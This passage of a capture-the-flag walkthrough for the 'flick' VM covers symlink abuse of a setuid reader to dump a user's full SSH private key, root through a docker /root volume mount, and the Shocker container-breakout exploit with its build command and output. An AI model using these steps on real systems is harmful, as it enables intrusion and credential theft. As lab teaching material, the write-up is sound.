<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dean@flick:~$ file read_docker
</span><span class='line'>read_docker: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x5b429ab297ac0bd55150f9ef54738b366f643336, not stripped
</span><span class='line'>
</span><span class='line'>dean@flick:~$ strings read_docker
</span><span class='line'>/lib64/ld-linux-x86-64.so.2
</span><span class='line'>sT63do
</span><span class='line'>__gmon_start__
</span><span class='line'>libc.so.6
</span><span class='line'>sprintf
</span><span class='line'>fopen
</span><span class='line'>fgetc
</span><span class='line'>memset
</span><span class='line'>stdout
</span><span class='line'>fputc
</span><span class='line'>fclose
</span><span class='line'>malloc
</span><span class='line'>stderr
</span><span class='line'>fwrite
</span><span class='line'>fprintf
</span><span class='line'>__libc_start_main
</span><span class='line'>free
</span><span class='line'>GLIBC_2.2.5
</span><span class='line'>%z     
</span><span class='line'>%r     
</span><span class='line'>%j     
</span><span class='line'>%b     
</span><span class='line'>%Z     
</span><span class='line'>%R     
</span><span class='line'>%J     
</span><span class='line'>%B     
</span><span class='line'>%:     
</span><span class='line'>fff.
</span><span class='line'>l$ L
</span><span class='line'>t$(L
</span><span class='line'>|$0H
</span><span class='line'>/Dockerfile
</span><span class='line'>ERROR: A path is required!
</span><span class='line'>Usage is: %s /path/to/dockerfile
</span><span class='line'>%s%s
</span><span class='line'>ERROR: the specified docker file doesn't exist: %s
</span><span class='line'>;*3$"</span></code></pre></td></tr></table></div></figure>


<p>Well, this is a SUID binary, and the owner is robin, so we should be able to read files that robin has permissions to read..or so I thought:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dean@flick:~$ ./read_docker /home/robin/.bash_history
</span><span class='line'>ERROR: the specified docker file doesn't exist: /home/robin/.bash_history/Dockerfile
</span><span class='line'>Usage is: ./read_docker /path/to/dockerfile</span></code></pre></td></tr></table></div></figure>


<p>So it appears to append a Dockerfile to the path that you enter. Judging from this, it won&rsquo;t be able to read the contents if there is no Dockerfile present. But what if we create a Dockerfile in dean&rsquo;s home directory and link it to stuff that robin should have access to? I still couldn&rsquo;t read the <em>.bash_history</em> file, so there probably isn&rsquo;t one, but..</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ean@flick:~$ ln -s /home/robin/.bashrc Dockerfile
</span><span class='line'>dean@flick:~$ ls -la
</span><span class='line'>total 44
</span><span class='line'>drwxr-xr-x 3 dean  dean  4096 Feb 23 13:54 .
</span><span class='line'>drwxr-xr-x 4 root  root  4096 Aug  2  2014 ..
</span><span class='line'>-rw------- 1 dean  dean   143 Feb 13 15:46 .bash_history
</span><span class='line'>-rw-r--r-- 1 dean  dean   220 Aug  2  2014 .bash_logout
</span><span class='line'>-rw-r--r-- 1 dean  dean  3486 Aug  2  2014 .bashrc
</span><span class='line'>drwx------ 2 dean  dean  4096 Aug  2  2014 .cache
</span><span class='line'>lrwxrwxrwx 1 dean  dean    19 Feb 23 13:54 Dockerfile -&gt; /home/robin/.bashrc
</span><span class='line'>-rw-r--r-- 1 root  root  1250 Aug  4  2014 message.txt
</span><span class='line'>-rw-r--r-- 1 dean  dean   675 Aug  2  2014 .profile
</span><span class='line'>-rwsr-xr-x 1 robin robin 8987 Aug  4  2014 read_docker</span></code></pre></td></tr></table></div></figure>


<p>If you look at the link you created, it says it&rsquo;s a broken symbolic link:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dean@flick:~$ file Dockerfile 
</span><span class='line'>Dockerfile: broken symbolic link to `/home/robin/.bashrc'</span></code></pre></td></tr></table></div></figure>


<p>However, that doesn&rsquo;t seem to stop the <em>read_docker</em> binary from doing its thing!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dean@flick:~$ ./read_docker /home/dean
</span><span class='line'># ~/.bashrc: executed by bash(1) for non-login shells.
</span><span class='line'># see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
</span><span class='line'># for examples
</span><span class='line'>
</span><span class='line'># If not running interactively, don't do anything
</span><span class='line'>[ -z "$PS1" ] && return
</span><span class='line'>
</span><span class='line'># don't put duplicate lines or lines starting with space in the history.
</span><span class='line'># See bash(1) for more options
</span><span class='line'>HISTCONTROL=ignoreboth
</span><span class='line'>
</span><span class='line'># append to the history file, don't overwrite it
</span><span class='line'>shopt -s histappend
</span><span class='line'>
</span><span class='line'># for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
</span><span class='line'>HISTSIZE=1000
</span><span class='line'>HISTFILESIZE=2000
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>So,we were able to read robin&rsquo;s <em>.bashrc</em> file. That doesn&rsquo;t help us much, but now we know that we can use this to our advantage, if the file that we want to read exists. Let&rsquo;s see if we can&rsquo;t get robin&rsquo;s SSH private key:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dean@flick:~$ ln -s /home/robin/.ssh/id_rsa Dockerfile
</span><span class='line'>dean@flick:~$ ls -la Dockerfile 
</span><span class='line'>lrwxrwxrwx 1 dean dean 23 Feb 23 14:06 Dockerfile -&gt; /home/robin/.ssh/id_rsa
</span><span class='line'>
</span><span class='line'>dean@flick:~$ ./read_docker /home/dean
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
</span><span class='line'>ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
</span><span class='line'>FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
</span><span class='line'>S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
</span><span class='line'>CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
</span><span class='line'>d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
</span><span class='line'>jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
</span><span class='line'>wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
</span><span class='line'>tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
</span><span class='line'>Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
</span><span class='line'>wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
</span><span class='line'>mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
</span><span class='line'>l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
</span><span class='line'>JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
</span><span class='line'>gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
</span><span class='line'>JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
</span><span class='line'>rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
</span><span class='line'>PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
</span><span class='line'>zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
</span><span class='line'>AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
</span><span class='line'>EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
</span><span class='line'>mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
</span><span class='line'>JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
</span><span class='line'>Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
</span><span class='line'>VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
</span><span class='line'>-----END RSA PRIVATE KEY-----</span></code></pre></td></tr></table></div></figure>


<p>Woohoo! It worked! With this we can SSH as robin. I copied the key contents to my machine (don&rsquo;t forget to <em>chmod 600</em>, or you will get an Unprotected Private Key File eror), and logged in as robin.</p>

<p>After a bit of enumeration, I didn&rsquo;t find anything extremely interesting. User robin is able to sudo the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robin@flick:/opt/start_apache$ sudo -l
</span><span class='line'>Matching Defaults entries for robin on this host:
</span><span class='line'>    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span><span class='line'>
</span><span class='line'>User robin may run the following commands on this host:
</span><span class='line'>    (root) NOPASSWD: /opt/start_apache/restart.sh</span></code></pre></td></tr></table></div></figure>


<p>I couldn&rsquo;t read the files in that directory (there is an additional file called <em>start.py</em>), because I got a permission denied error. With nothing else to follow, perhaps there is more to be gained from the Docker program. The official documentation for Docker <a href="https://docs.docker.com/reference/commandline/cli/">commands</a> came in handy.</p>

<p>First, I listed all the available containers, and found something:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robin@flick:/opt/start_apache$ docker ps -a
</span><span class='line'>CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                    PORTS               NAMES
</span><span class='line'>b0f71c63a88c        ubuntu:14.04        /bin/bash           7 months ago        Exited (0) 7 months ago                       sharp_shockley  </span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s possible to set up a console session with the container (check the help for the run command to see all the kinds of things you can do with it):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robin@flick:/opt/start_apache$ docker run -i -t ubuntu
</span><span class='line'>root@4dfeb7b4ed8c:/# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Breaking up the command:</p>

<ul>
<li>Usage: docker run [OPTIONS] IMAGE [COMMAND] [ARG&hellip;]</li>
</ul>


<p>Run a command in a new container</p>

<ul>
<li><p>-i, &mdash;interactive=false: Keep stdin open even if not attached</p></li>
<li><p>-t, &mdash;tty=false: Allocate a pseudo-tty</p></li>
</ul>


<p>But even if we can run as root inside the container, it doesn&rsquo;t solve the problem of getting root outside it. However, I looked more closely at the options for <em>run</em> and I noticed this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-v, --volume=[]: Bind mount a volume (e.g. from the host: -v /host:/container, from docker: -v /container)</span></code></pre></td></tr></table></div></figure>


<p>Reading the <a href="https://docs.docker.com/userguide/dockervolumes/">documentation</a>, it seems it&rsquo;s possible to mount a volume from the host?! Let&rsquo;s see:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>docker run -i -t -v /root/:/root/ ubuntu
</span><span class='line'>root@4340d77a56d3:/# ls /root/
</span><span class='line'>53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc  flag.txt</span></code></pre></td></tr></table></div></figure>


<p>Success! If you can&rsquo;t get root on the box, bring the box to where you are root! :D</p>

<p>The obvious flag is just a decoy:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@4340d77a56d3:/# cat /root/flag.txt
</span><span class='line'>Errr, you are close, but this is not the flag you are looking for.</span></code></pre></td></tr></table></div></figure>


<p>Of course, the real flag is cleverly hidden inside the directory with a name that screams for attention:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@4340d77a56d3:/# ls /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
</span><span class='line'>real_flag.txt
</span><span class='line'>root@4340d77a56d3:/# cat /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt 
</span><span class='line'>Congrats!
</span><span class='line'>
</span><span class='line'>You have completed 'flick'! I hope you have enjoyed doing it as much as I did creating it :)
</span><span class='line'>
</span><span class='line'>ciao for now!
</span><span class='line'>@leonjza</span></code></pre></td></tr></table></div></figure>


<h3>Bonus &ndash; get root command execution on host</h3>

<p>Ok, after an overly lengthy break, I returned to the bonus part of the challenge. I will use an alternate way for this instead of proceeding from where I left off.</p>

<p>Remember the files in <em>/opt/</em> that I couldn&rsquo;t read? Naturally, I was curious about them, and they provide an alternate path to exploitation. And the fact that the Docker version on the box is out of date.. :D</p>

<p>During my initial enumeration, I didn&rsquo;t pay much attention to the fact that Docker is outdated, as can be seen from the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robin@flick:~$ docker version
</span><span class='line'>Client version: 0.11.0
</span><span class='line'>Client API version: 1.11
</span><span class='line'>Go version (client): go1.2.1
</span><span class='line'>Git commit (client): 15209c3
</span><span class='line'>Server version: 0.11.0
</span><span class='line'>Server API version: 1.11
</span><span class='line'>Git commit (server): 15209c3
</span><span class='line'>Go version (server): go1.2.1
</span><span class='line'>Last stable version: 1.5.0, please update docker</span></code></pre></td></tr></table></div></figure>


<p>So..maybe there is some nice exploit that can assist us? It turns there is! And it&rsquo;s called <a href="https://github.com/gabrtv/shocker">Shocker</a></p>

<p>A good description of this container-breakout exploit, along with code, can be found <a href="http://stealth.openwall.net/xSports/shocker.c">here</a>. I will quote the gist of it:</p>

<blockquote><p>Demonstrates that any given docker image someone is asking
you to run in your docker setup can access ANY file on your host,
e.g. dumping hosts /etc/shadow or other sensitive info, compromising
security of the host and any other docker VM&rsquo;s on it.</p></blockquote>

<p>I could of course read <em>/etc/shadow</em> or the flags, but I&rsquo;m interested in the <em>/opt/start_apache/</em> files. To read them, you have to modify the code here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">find_handle</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="s">&quot;/etc/shadow&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">root_h</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">h</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>  <span class="n">die</span><span class="p">(</span><span class="s">&quot;[-] Cannot find valid handle!&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Just insert the path to the file you want to read instead of <em>etc/shadow</em>. So we want <em>/opt/start_apache/restart.sh</em> and <em>/opt/start_apache/start.py</em>. To run the PoC exploit, use the command <code>docker run gabrtv/shocker</code>. To modify source and rebuild, use <code>docker build -t gabrtv/shocker .</code>. I got an error saying that no Dockerfile was found in the current directory, so I just pulled the one from Github and it worked. To compile the exploit (on the Flick box), use the command found in the Dockerfile on Github:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker</span></code></pre></td></tr></table></div></figure>


<p>After rebuilding, I ran the exploit and:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robin@flick:~$ docker run gabrtv/shocker
</span><span class='line'>[***] docker VMM-container breakout Po(C) 2014             [***]
</span><span class='line'>[***] The tea from the 90's kicks your sekurity again.     [***]
</span><span class='line'>[***] If you have pending sec consulting, I'll happily     [***]
</span><span class='line'>[***] forward to my friends who drink secury-tea too!      [***]
</span><span class='line'>
</span><span class='line'>&lt;enter&gt;
</span><span class='line'>[*] Resolving 'opt/start_apache/restart.sh'
</span><span class='line'>[*] Found .
</span><span class='line'>[*] Found mnt
</span><span class='line'>[*] Found home
</span><span class='line'>[*] Found root
</span><span class='line'>[*] Found lost+found
</span><span class='line'>[*] Found media
</span><span class='line'>[*] Found selinux
</span><span class='line'>[*] Found boot
</span><span class='line'>[*] Found srv
</span><span class='line'>[*] Found lib
</span><span class='line'>[*] Found dev
</span><span class='line'>[*] Found proc
</span><span class='line'>[*] Found bin
</span><span class='line'>[*] Found lib64
</span><span class='line'>[*] Found etc
</span><span class='line'>[*] Found ..
</span><span class='line'>[*] Found var
</span><span class='line'>[*] Found sbin
</span><span class='line'>[*] Found sys
</span><span class='line'>[*] Found opt
</span><span class='line'>[+] Match: opt ino=246
</span><span class='line'>[*] Brute forcing remaining 32bit. This can take a while...
</span><span class='line'>[*] (opt) Trying: 0x00000000
</span><span class='line'>[*] #=8, 1, char nh[] = {0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
</span><span class='line'>[*] Resolving 'start_apache/restart.sh'
</span><span class='line'>[*] Found .
</span><span class='line'>[*] Found ..
</span><span class='line'>[*] Found start_apache
</span><span class='line'>[+] Match: start_apache ino=137500
</span><span class='line'>[*] Brute forcing remaining 32bit. This can take a while...
</span><span class='line'>[*] (start_apache) Trying: 0x00000000
</span><span class='line'>[*] #=8, 1, char nh[] = {0x1c, 0x19, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
</span><span class='line'>[*] Resolving 'restart.sh'
</span><span class='line'>[*] Found .
</span><span class='line'>[*] Found start.py
</span><span class='line'>[*] Found ..
</span><span class='line'>[*] Found restart.sh
</span><span class='line'>[+] Match: restart.sh ino=173642
</span><span class='line'>[*] Brute forcing remaining 32bit. This can take a while...
</span><span class='line'>[*] (restart.sh) Trying: 0x00000000
</span><span class='line'>[*] #=8, 1, char nh[] = {0x4a, 0xa6, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
</span><span class='line'>[!] Got a final handle!
</span><span class='line'>[*] #=8, 1, char nh[] = {0x4a, 0xa6, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
</span><span class='line'>[!] Win! /etc/shadow output follows:
</span><span class='line'>#!/bin/sh
</span><span class='line'>/usr/sbin/service apache2 restart
</span><span class='line'>/usr/bin/supervisorctl restart all</span></code></pre></td></tr></table></div></figure>


<p>I was too lazy to modify the print statement, the actual file that was read was the <em>restart.sh</em> file. Not very interesting, so I looked at the other one (this time I&rsquo;m only showing the code):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">    Simple socket server using threads. Used in the flick CTF</span>
</span><span class='line'><span class="sd">    Credit: http://www.binarytides.com/python-socket-server-code-example/</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">signal</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">thread</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">subprocess</span>
</span><span class='line'>
</span><span class='line'><span class="c"># import the directory containing our config, and prevent the bytcode writes</span>
</span><span class='line'><span class="n">sys</span><span class="o">.</span><span class="n">dont_write_bytecode</span> <span class="o">=</span> <span class="bp">True</span>
</span><span class='line'>
</span><span class='line'><span class="c"># see if /tmp has a configuration to load.</span>
</span><span class='line'><span class="c"># Debugging purposes only!!!</span>
</span><span class='line'><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="s">&#39;/tmp/config.py&#39;</span><span class="p">):</span>
</span><span class='line'>  <span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#39;/tmp&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>  <span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#39;/etc&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># import the config</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">config</span> <span class="kn">import</span> <span class="n">config</span>
</span><span class='line'>
</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>   <span class="c"># Symbolic name meaning all available interfaces</span>
</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">8881</span> <span class="c"># Arbitrary non-privileged port</span>
</span><span class='line'>
